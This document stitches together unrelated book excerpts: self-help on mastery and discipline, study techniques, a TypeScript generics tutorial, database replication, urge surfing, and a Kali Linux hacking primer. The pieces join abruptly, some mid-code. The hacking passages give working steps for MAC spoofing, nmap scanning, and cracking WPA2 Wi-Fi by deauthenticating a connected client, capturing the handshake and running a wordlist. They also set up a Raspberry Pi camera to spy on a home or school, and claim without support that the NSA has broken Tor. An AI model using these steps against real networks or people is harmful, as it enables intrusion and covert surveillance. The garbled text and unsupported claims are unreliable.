You are not tied to a particular position; your loyalty is not to a career or a company. You are committed to your Life’s Task, to giving it full expression. It is up to you to find it and guide it correctly. It is not up to others to protect or help you. You are on your own.

The way back requires a sacrifice. You cannot have everything in the present. The road to mastery requires patience. You will have to keep your focus on five or ten years down the road, when you will reap the rewards of your efforts. The process of getting there, however, is full of challenges and pleasures. Make your return to the path a resolution you set for yourself, and then tell others about it.

To attain mastery, you must adopt what we shall call Resistance Practice. The principle is simple—you go in the opposite direction of all of your natural tendencies when it comes to practice. First, you resist the temptation to be nice to yourself. You become your own worst critic; you see your work as if through the eyes of others. You recognize your weaknesses, precisely the elements you are not good at.

Second, you resist the lure of easing up on your focus. You train yourself to concentrate in practice with double the intensity, as if it were the real thing times two. In devising your own routines, you become as creative as possible. You invent exercises that work upon your weaknesses. You give yourself arbitrary deadlines to meet certain standards, constantly pushing yourself past perceived limits. In this way you develop your own standards for excellence, generally higher than those of others. In the end, your five hours of intense, focused work are the equivalent of ten for most people. Soon enough you will see the results of such practice, and others will marvel at the apparent ease in which you accomplish your deeds.

Some people maintain their childlike spirit and spontaneity, but their creative energy is dissipated in a thousand directions, and they never have the patience and discipline to endure an extended apprenticeship. Others have the discipline to accumulate vast amounts of knowledge and become experts in their field, but they have no flexibility of spirit, so their ideas never stray beyond the conventional and they never become truly creative. Masters manage to blend the two—discipline and a childlike spirit—together into what we shall call the Dimensional Mind.

Practice Retrieving New Learning from Memory What does this mean? “Retrieval practice” means self-quizzing. Retrieving knowledge and skill from memory should become your primary study strategy in place of rereading. How to use retrieval practice as a study strategy: When you read a text or study lecture notes, pause periodically to ask yourself questions like these, without looking in the text: What are the key ideas? What terms or ideas are new to me? How would I define them? How do the ideas relate to what I already know?

How to use spaced practice as a study strategy: Establish a schedule of self-quizzing that allows time to elapse between study sessions. How much time? It depends on the material. If you are learning a set of names and faces, you will need to review them within a few minutes of your first encounter, because these associations are forgotten quickly. New material in a text may need to be revisited within a day or so of your first encounter with it. Then, perhaps not again for several days or a week. When you are feeling more sure of your mastery of certain material, quiz yourself on it once a month.

Interleave the Study of Different Problem Types What does this mean?

If you are studying biology specimens, Dutch painters, or the principles of macroeconomics, mix up the examples.

How to use interleaved practice as a study strategy: Many textbooks are structured in study blocks: They present the solution to a particular kind of problem, say, computing the volume of a spheroid, and supply many examples to solve before moving to another kind of problem (computing the volume of a cone). Blocked practice is not as effective as interleaved practice, so here’s what to do.

Why interleaved practice is better: Mixing up problem types and specimens improves your ability to discriminate between types, identify the unifying characteristics within a type, and improves your success in a later test or in real-world settings where you must discern the kind of problem you’re trying to solve in order to apply the correct solution.

How it feels: Blocked practice—that is, mastering all of one type of problem before progressing to practice another type—feels (and looks) like you’re getting better mastery as you go, whereas interrupting the study of one type to practice a different type feels disruptive and counterproductive. Even when learners achieve superior mastery from interleaved practice, they persist in feeling that blocked practice serves them better. You may also experience this feeling, but you now have the advantage of knowing that studies show that this feeling is illusory.

                      //        because type '{}' has no index signature
} TypeScript is now complaining that the string type for key is too broad. And it’s right to do so: if you pass in an array of Albums then there are only four valid values for key (“artist,” “title,” “releaseDate,” and “recordingType”), as opposed to the vast set of strings. This is precisely what the keyof Album type is: type K = keyof Album;
// Type is "artist" | "title" | "releaseDate" | "recordingType" So the fix is to replace string with keyof T: function pluck<T>(record: T[], key: keyof T) {
  return record.map(r => r[key]);
} This passes the type checker. We’ve also let TypeScript infer the return type. How does it do? If you mouse over pluck in your editor, the inferred type is: function pluck<T>(record: T[], key: keyof T): T[keyof T][] T[keyof T] is the type of any possible value in T. If you’re passing in a single string as the key, this is too broad. For example: const releaseDates = pluck(albums, 'releaseDate'); // Type is (string | Date)[] The type should be Date[], not (string | Date)[]. While keyof T is much narrower than string, it’s still too broad. To narrow it further, we need to introduce a second generic parameter that is a subset of keyof T (probably a single value): function pluck<T, K extends keyof T>(record: T[], key: K): T[K][] {
  return record.map(r => r[key]);
} (For more on extends in this context, see Item 14.) The type signature is now completely correct. We can check this by calling pluck in a few different ways: pluck(albums, 'releaseDate'); // Type is Date[]
pluck(albums, 'artist');  // Type is string[]
pluck(albums, 'recordingType');  // Type is RecordingType[]
pluck(albums, 'recordingDate');
           // ~~~~~~~~~~~~~~~ Argument of type '"recordingDate"' is not
           //                 assignable to parameter of type ... The language service is even able to offer autocomplete on the keys of Album (as shown in Figure 4-2). Figure 4-2. Using a parameter type of keyof Album instead of string results in better autocomplete in your editor. string has some of the same problems as any: when used inappropriately, it permits invalid values and hides relationships between types. This thwarts the type checker and can hide real bugs. TypeScript’s ability to define subsets of string is a powerful way to bring type safety to JavaScript code. Using more precise types will both catch errors and improve the readability of your code.

The unknown type is an alternative to any that does fit into the type system. It has the first property (any type is assignable to unknown) but not the second (unknown is only assignable to unknown and, of course, any). The never type is the opposite: it has the second property (can be assigned to any other type) but not the first (nothing can be assigned to never). Attempting to access a property on a value with the unknown type is an error. So is attempting to call it or do arithmetic with it. You can’t do much with unknown, which is exactly the point. The errors about an unknown type will encourage you to add an appropriate type: const book = safeParseYAML(`
  name: Villette
  author: Charlotte Brontë
`) as Book;
alert(book.title);
        // ~~~~~ Property 'title' does not exist on type 'Book'
book('read');
// ~~~~~~~~~ this expression is not callable These errors are more sensible. Since unknown is not assignable to other types, a type assertion is required. But it is also appropriate: we really do know more about the type of the resulting object than TypeScript does. unknown is appropriate whenever you know that there will be a value but you don’t know its type. The result of parseYAML is one example, but there are others. In the GeoJSON spec, for example, the properties property of a Feature is a grab-bag of anything JSON serializable. So unknown makes sense: interface Feature {
  id?: string | number;
  geometry: Geometry;
  properties: unknown;
} A type assertion isn’t the only way to recover a type from an unknown object. An instanceof check will do: function processValue(val: unknown) {
  if (val instanceof Date) {
    val  // Type is Date
  }
} You can also use a user-defined type guard: function isBook(val: unknown): val is Book {
  return (
      typeof(val) === 'object' && val !== null &&
      'name' in val && 'author' in val
  );
}
function processValue(val: unknown) {
  if (isBook(val)) {
    val;  // Type is Book
  }

Advantages of database replication: •Better performance: In the master-slave model, all writes and updates happen in master nodes; whereas, read operations are distributed across slave nodes. This model improves performance because it allows more queries to be processed in parallel. •Reliability: If one of your database servers is destroyed by a natural disaster, such as a typhoon or an earthquake, data is still preserved. You do not need to worry about data loss because data is replicated across multiple locations. •High availability: By replicating data across different locations, your website remains in operation even if a database is offline as you can access data stored in another database server.

find it useful to break down metalearning research that you do for a specific project into three questions: “Why?,” “What?,” and “How?” “Why?” refers to understanding your motivation to learn. If you know exactly why you want to learn a skill or subject, you can save a lot of time by focusing your project on exactly what matters most to you. “What?” refers to the knowledge and abilities you’ll need to acquire in order to be successful. Breaking things down into concepts, facts, and procedures can enable you to map out what obstacles you’ll face and how best to overcome them. “How?” refers to the resources, environment, and methods you’ll use when learning. Making careful choices here can make a big difference in your overall effectiveness. With these three questions in mind, let’s take a look at each of them and how you can draw your map.

You may find yourself starting but then, because the task is unpleasant and focus is hard, taking advantage of the five-minute rule too often to be productive. If this is the case and your problem has switched from being unable to get started to taking breaks too often, you can try something a little harder, say the Pomodoro Technique: twenty-five minutes of focus followed by a five-minute break.

For instance, a programmer may realize a need to use a certain function to solve a problem but forgets how to write it out. Needing to look up the syntax might slow her down, but she will still be able to solve the problem. However, if you don’t have enough knowledge stored to recognize when you can use a function to solve your problem, no looking up can help you.

applying overlearning. The first is core practice, continually practicing and refining the core elements of a skill. This approach often works well paired with some kind of immersion or working on extensive (as opposed to intensive) projects, after the initial ultralearning phase has been completed. The shift from learning to doing here may actually involve a deeper, subtler form of learning, which shouldn’t be discounted as simply applying previously learned knowledge. The second strategy is advanced practice, going one level above a certain set of skills so that core parts of the lower-level skills are overlearned as one applies them in a more difficult domain.

To create more urgency, you can take one or more of the following actions: Set a clear deadline. Choose a specific date that sounds realistic while still being somewhat challenging. This will create a sense of urgency. Install an accountability system. For instance, you can hire a coach or work with an accountability partner. Divide your projects into multiple milestones. This will make it less daunting. When Stephen King was asked how he writes, he replied, “One word at a time.” Similarly, the Great Wall of China was built one stone at a time. Measure your progress often. See how you fare in regard to your milestones. Are you behind? If so, what can you do to catch up? As the management consultant, Peter Drucker said, “What gets measured gets done.”

People with poor working memory can be especially creative! This creativity is particularly noticeable in people who have attentional “disorders” (we think the term should be “advantages”) like ADHD.3 People with poor working memory and focus sometimes have to work harder than others to make brain-links. But the trade-off is that it can be easier for them to be more creative. They see elegant shortcuts and have ideas that others miss. The trade-off can be worth it!

Elena advises: “When you don’t understand some item you are studying, maybe a mathematical formula, or a really long sentence . . . just write it down, once, twice . . . Sometimes this helps you make sense of it. Writing it down can help you jump mental barriers and install the information deeply in another place in our brains where it is processed differently.” Next time you encounter something you find difficult to understand, try Elena’s trick.

While you may be happy for them, it’s possible that you’ll still feel a bit of envy or regret. Those feelings can motivate you to pursue your own goals with a renewed enthusiasm and discipline. An event that had an incredibly low probability of occurring can serve as a life-changing catalyst given the right circumstances.

When you feel an urge, force yourself to wait for 10 minutes before giving in to whatever the urge is. If you’re still craving it after 10 minutes, then have it. Or wait 10 more minutes because you’ve already done it and survived just fine. Simply by choosing to wait you remove the “immediate” from immediate gratification—building discipline and improving decision-making.

Another beneficial application of this thought process is the purposeful escalation of good habits. If you’re doing something productive you might keep doing it for five minutes longer after you first feel the urge to quit. Then the following time you go for an extra six or seven minutes, and so on. Every time you feel distracted, just exercise discipline for a few minutes longer, and you’ll steadily build better self-discipline with each escalation.

urge surfing is before moving on: Pause whatever you are doing for a moment and think about an urge that you recently felt. Whatever the urge was, think about it and pay attention to the physical and emotional sensations experienced with it. Indulge in it. Notice how these sensations evolve over time. As you’re doing this, softly focus on your breath to help you ride out the urges, imagining that they are waves and you are surfing across them.   Our natural tendency is to identify with our urges, and urge surfing helps us to separate our identity from whatever past habits and tendencies we want to correct. Instead of thinking, I want a cigarette, you might think, I have an urge to have a cigarette. It’s not a part of you that you must fight, but rather a sensation that you experience, observe, and then let pass or settle. Fighting urges is rarely effective, but curiously observing urges without identifying with them gives you much greater odds to overcome them.

A typical urge will peak between 20 and 30 minutes if you battle it. Battling urges, or trying to get rid of them, is counterproductive as it usually makes them stronger and longer-lasting. Furthermore, battling an urge makes it that much more deeply ingrained while simultaneously weakening your confidence in your ability to change it in the future. But when you choose an open attitude about your urges and watch them without fighting them, they subside much more quickly and effortlessly.

If you can successfully change your attitude about urges and temptations to one of curiosity instead of fear or resignation, you’ll also be able to change your behavior. Scientifically study your own habits. But as long as you fight your urges, you’re setting yourself up for failure. In learning to accept and observe them, you make it possible to watch them quickly fade away.

The next time you feel an urge and you are ready to implement the urge surfing technique, follow these steps: Take a few moments to notice where in your body you are experiencing the urges. Just as hearing music might give you an urge to tap your feet or bob your head, most urges can actually be felt in the body if we have awareness. Once you connect the urge to the place in your body that it’s felt most strongly, focus your attention on that area. Observe the sensations you have there. Spend 1–2 minutes noticing your breath. Imagine that the sensations you feel as a result of your urge are a wave. Watch that wave rising and falling as your urge peaks and subsides. As the urge inevitably passes, take note of its transient nature. The next time an urge arises, you’ll be that much more confident in your ability to ride it out to its conclusion.

A more practical application of the study’s findings is just thinking of your future self experiencing the consequences of your present self’s actions more often. For example, imagine that you are tempted to procrastinate on work. Rather than giving in to that temptation, you could think about your future self not doing the work and missing out on opportunities to socialize and have fun or just relax without stress because your present self wants to be lazy. Put yourself in the shoes of your future self with as much detail as possible. Think about how much you’ll suffer and how what the real cost-benefit of your lack of discipline is.

You can also change your network mask (netmask) and broadcast address with the ifconfig command. For instance, if you want to assign that same eth0 interface with a netmask of 255.255.0.0 and a broadcast address of 192.168.1.255, you would enter the following: kali >ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast 192.168.1.255 kali >

Spoofing Your MAC Address You can also use ifconfig to change your MAC address (or HWaddr). The MAC address is globally unique and is often used as a security measure to keep hackers out of networks—or to trace them. Changing your MAC address to spoof a different MAC address is almost trivial and neutralizes those security measures.

To spoof your MAC address, simply use the ifconfig command’s down option to take down the interface (eth0 in this case). Then enter the ifconfig command followed by the interface name (hw for hardware, ether for Ethernet) and the new spoofed MAC address. Finally, bring the interface back up with the up option for the change to take place. Here’s an example: kali >ifconfig eth0 down kali >ifconfig eth0 hw ether 00:11:22:33:44:55 kali >ifconfig eth0 up

kali >echo "nameserver 8.8.8.8"> /etc/resolv.conf This command echoes the string nameserver 8.8.8.8 and redirects it (>) to the file /etc/resolv.conf, replacing the current content. Your /etc/resolv.conf file should now look like Figure 3-2. Figure 3-2: Changing the resolv.conf file to specify Google’s DNS server If you open the /etc/resolv.conf file now, you should see that it points the DNS requests to Google’s DNS server rather than your local DNS server. Your system will now go out to the Google public DNS server to resolve domain names to IP addresses. This can mean domain names take a little longer to resolve (probably milliseconds).

In its simplest form, the syntax for running an nmap scan looks like this: nmap <type of scan><target IP><optionally, target port> Not too difficult. The simplest and most reliable nmap scan is the TCP connect scan, designated with the -sT switch in nmap. So, if you wanted to scan IP address 192.168.181.1 with a TCP scan, you would enter the following: nmap -sT 192.168.181.1 To take things a step further, if you wanted to perform a TCP scan of address 192.168.181.1, looking to see whether port 3306 (the default port for MySQL) was open, you could enter this: nmap -sT 192.168.181.1 -p 3306 Here, -p designates the port you want to scan for.

the dd command will allow them to copy the entire hard drive or a storage device to their system. In addition, those people whose job it is to catch hackers—namely, forensic investigators—will likely use this command to make a physical copy of the hard drive with deleted files and other artifacts that might be useful for finding evidence against the hacker.

It is, though, excellent when you need a copy of a storage device without the filesystem or other logical structures, such as in a forensic investigation. The basic syntax for the dd command is as follows: dd if=inputfile of=outputfile So, if you wanted to make a physical copy of your flash drive, assuming the flash drive is sdb (we’ll discuss this designation more in Chapter 10), you would enter the following: kali >dd if=/dev/sdb of=/root/flashcopy 1257441=0 records in 1257440+0 records out 7643809280 bytes (7.6 GB) copied, 1220.729 s, 5.2 MB/s Let’s break down this command: dd is your physical “copy” command; if designates your input file, with /dev/sdb representing your flash drive in the /dev directory; of designates your output file; and /root/flashcopy is the name of the file you want to copy the physical copy to.

At times, you may want to view the partitions on your Linux system to see which ones you have and how much capacity is available in each. You can do this by using the fdisk utility. Using the -l switch with fdisk lists all the partitions of all the drives, as shown in Listing 10-2. kali >fdisk -l Disk

The mount point for the device should be an empty directory; if you mount a device on a directory that has subdirectories and files, the mounted device will cover the contents of the directory, making them invisible and unavailable. So, to mount the new hard drive sdb1 at the /mnt directory, you would enter the following: kali >mount /dev/sdb1 /mnt That hard drive should then be available for access. If you want to mount the flash drive sdc1 at the /media directory, you would enter this: kali >mount /dev/sdc1 /media The filesystems that are mounted on a system are kept in a file at /etc/fstab (short for filesystem table), which is read by the system at every bootup.

Similar to the mount command, you can unmount a second hard drive by entering the umount command followed by the file entry of the device in the /dev directory, such as /dev/sdb. Note that the command is not spelled unmount but rather umount (no n). kali >umount /dev/sdb1 You cannot unmount a device that is busy, so if the system is reading or writing to the device, you will just receive an error.

The fsck command (short for filesystem check) checks the filesystem for errors and repairs the damage, if possible, or else puts the bad area into a bad blocks table to mark it as bad. To run the fsck command, you need to specify the filesystem type (the default is ext2) and the device file to check. It’s important to note that you must unmount the drive before running a filesystem check. If you fail to unmount the mounted device, you will receive the error message shown in Listing 10-5. kali >fsck fsck from util-linux 2.20.1 e2fsck 1.42.5 (29-Jul-2012) /dev/sda1 is mounted e2fsck: Cannot continue, aborting.

kali >shred --help Usage: shred [OPTION]...FILE... Overwrite the specified FILE(s) repeatedly in order to make it harder for even very expensive hardware probing to recover data --snip-- As you can see from the full output on your screen, the shred command has many options. In its most basic form, the syntax is simple: shred <FILE> On its own, shred will delete the file and overwrite it several times—by default, shred overwrites four times. Generally, the more times the file is overwritten, the harder it is to recover, but keep in mind that each overwrite takes time, so for very large files, shredding may become time-consuming.

SSH is an acronym for Secure Shell and is basically what enables us to connect securely to a terminal on a remote system—a replacement for the insecure telnet that was so common years ago. When we’re building a web server, SSH enables us to create an access list (a list of users who can use this service), authenticate users with encrypted passwords, and encrypt all communication.

kali >service ssh start Next you need to attach your camera module. If you’re using a Raspberry Pi version 3 board, there’s only one place to connect it. Switch the Pi off, attach the module to the camera port, and then switch it on again. Note that the camera is very fragile and must never come into contact with the general-purpose input/output (GPIO) pins; otherwise, it might short and die. Now, with the SSH service up and running, place the Raspberry Spy Pi somewhere within your home, school, or some other location you want to spy on. It must, of course, be connected to the local area network, either by Ethernet cable or, ideally, via Wi-Fi. (The new Raspberry Pi 3 and Raspberry Pi Zero both have built-in Wi-Fi.) Now, you need to obtain the IP address of your Raspberry Pi. As you learned in Chapter 3, you can get a Linux device’s IP address by using ifconfig: pi >ifconfig The IP address of my Pi is 192.168.1.101, but make certain you are using the IP address of your Raspberry Spy Pi wherever my address appears in this chapter. Now, from your Kali system, you should be able to connect directly to and control your Raspberry Spy Pi and use it as a remote spying system. In this simple example, your system will need to be on the same network as the Pi. To connect to the remote Raspberry Spy Pi via SSH from your Kali system, enter the following, remembering to use your own Pi’s IP address: kali >ssh pi@192.168.1.101 pi@192.168.1.101's password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, the extent permitted by applicable law last login: Tues Jan. 1 12:01:01 2018 pi@raspberyypi:: $ The Spy Pi will then prompt you for a password. In this case, the default password is raspberry, unless you’ve changed it. Configuring the Camera Next, we need to configure the camera. To do so, start the Raspberry Pi configuration tool by entering the following command: pi >sudo raspi-config This should start a graphical menu like the one shown in Figure 12-3. Figure 12-3: The Raspberry Pi configuration tool Scroll down to 6 Enable Camera and press ENTER. Now, scroll to the bottom of this menu and select Finish and press ENTER, as shown in Figure 12-4.

To enable the use of Tor, just install the Tor browser from https://www.torproject.org/. Once installed, it will look something like Figure 13-2, and you can use it like any old internet browser. By using this browser, you’ll be navigating the internet through a separate set of routers and will be able to visit sites without being tracked by Big Brother. Unfortunately, the tradeoff is that surfing via the Tor browser can be a lot slower; because there are not nearly as many routers, the bandwidth is limited in this network.

As much as I like Tor, as mentioned, it is usually very slow. Also, because the NSA has broken Tor, I am much less likely to depend on it for anonymity. I therefore comment out this line and add my own set of proxies.

As a last note on proxy security, be sure to choose your proxies wisely: proxychains is only as good as the proxies you use. If you are intent on remaining anonymous, do not use a free proxy, as mentioned earlier. Hackers use paid-for proxies that can be trusted. In fact, the free proxies are likely selling your IP address and browsing history. As Bruce Schneier, the famous cryptographer and security expert, once said, “If something is free, you’re not the customer; you’re the product.” In other words, any free product is likely gathering your data and selling it.

ProtonMail was founded by a group of young scientists at the CERN supercollider facility in Switzerland. The Swiss have a long and storied history of protecting secrets (remember those Swiss bank accounts you’ve heard so much about?), and ProtonMail’s servers are based in the European Union, which has much stricter laws regarding the sharing of personal data than does the United States. ProtonMail does not charge for a basic account but offers premium accounts for a nominal fee. It is important to note that when exchanging email with non-ProtonMail users, there is the potential for some or all of the email not to be encrypted. See the ProtonMail support knowledge base for full details. Figure 13-5: The ProtonMail login screen

To use these tools effectively, you first need to put your wireless network card into monitor mode so that the card can see all the traffic passing its way. Normally, a network card captures only traffic destined specifically for that card. Monitor mode is similar to promiscuous mode on wired network cards.

Normally, a network card captures only traffic destined specifically for that card. Monitor mode is similar to promiscuous mode on wired network cards. To put your wireless network card in monitor mode, use the airmon-ng command from the aircrack-ng suite. The syntax for this command is simple: airmon-ng start|stop|restart interface So, if you want to put your wireless network card (designated wlan0) into monitor mode, you would enter the following: kali >airmon-ng start wlan0 Found three processes that could cause trouble If airodump-ng, aireplay-ng, or airtun-ng stops working after a short period of time, you may want to run 'airmon-ng check kill' --snip-- PHY         INTERFACE         DRIVER      Chipset phy0        wlan0             rt18187     Realtek Semiconductor Corop RTL8187     (mac8311 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon) --snip-- The stop and restart commands, respectively, stop monitor mode and restart monitor mode if you run into trouble. With your wireless card in monitor mode, you can access all the wireless traffic passing by you within the range of your wireless network adapter and antenna (standard is about 300–500 feet). Note that airmon-ng will rename your wireless interface: mine has been renamed “wlan0mon,” though yours may be different. Make certain to note the new designated name of your wireless because you’ll need that information in the next step. Now we’ll use another tool from the aircrack-ng suite to find key data from the wireless traffic. The airodump-ng command captures and displays the key data from broadcasting APs and any clients connected to those APs or within the vicinity. The syntax here is straightforward: simply plug in airdump-ng, followed by the interface name you got from running airmon-ng just now. When you issue this command, your wireless card will pick up crucial information (listed next) from all the wireless traffic of the APs nearby: BSSID The MAC address of the AP or client PWR The strength of the signal ENC The encryption used to secure the transmission #Data The data throughput rate CH The channel the AP is operating on ESSID The name of the AP kali >airodump-ng wlan0mon CH  9][  Elapsed: 28 s ][  2018-02-08 10:27 BSSID              PWR Beacons #Data #/s  CH MB  ENC   CIPHER  AUTH  ESSID 01:01:AA:BB:CC:22  -1        4    26   0  10 54e WPA2  CCMP   PSK  Hackers-Arise --snip-- BSSID               Station             PWR   Rate   Lost  Frames  Probe (not associated)    01:01:AA:BB:CC:22 01:02:CC:DD:03:CF   A0:A3:E2:44:7C:E5 Note that airodump-ng splits the output screen into an upper and lower portion. The upper portion has information on the broadcasting APs, including the BSSID, the power of the AP, how many beacon frames have been detected, the data throughput rate, how many packets have traversed the wireless card, the channel (1–14), the theoretical throughput limit, the encryption protocol, the cipher used for encryption, the authentication type, and the ESSID (commonly referred to as SSID). In the client portion, the output tells us that one client is not associated, meaning it has been detected but is not connected to any AP, and that another is associated with a station, meaning it’s connected to the AP at that address. Now you have all the information you need to crack the AP! Although it’s beyond the scope of this book, to crack the wireless AP, you need the client MAC address, the AP MAC address, the channel the target is operating on, and a password list. So to crack the Wi-Fi password, you would open three terminals. In the first terminal, you would enter commands similar to the following, filling in the client and AP MAC addresses and the channel: airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon This command captures all the packets traversing the AP on channel 10 using the -c option. In another terminal, you can use the aireplay-ng command to knock off (deauthenticate) anyone connected to the AP and force them to reauthenticate to the AP, as shown next. When they reauthenticate, you can capture the hash of their password that is exchanged in the WPA2-PSK four-way handshake. The password hash will appear in the upper-right corner of the airodump-ng terminal. aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22-c A0:A3:E2:44:7C:E5 wlan0mon Finally, in the final terminal, you can use a password list (wordlist.dic) to find the password in the captured hash (Hackers-ArisePSK.cap), as shown here: aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap

Linux has an implementation of the Bluetooth protocol stack called BlueZ that we’ll use to scan for Bluetooth signals. Most Linux distributions, including Kali Linux, have it installed by default. If yours doesn’t, you can usually find it in your repository using the following command: kali >apt-get install bluez BlueZ has a number of simple tools we can use to manage and scan Bluetooth devices, including the following: hciconfig This tool operates very similarly to ifconfig in Linux, but for Bluetooth devices. As you can see in Listing 14-1, I have used it to bring up the Bluetooth interface and query the device for its specs. hcitool This inquiry tool can provide us with device name, device ID, device class, and device clock information, which enables the devices to work synchronously. hcidump This tool enables us to sniff the Bluetooth communication, meaning we can capture data sent over the Bluetooth signal.
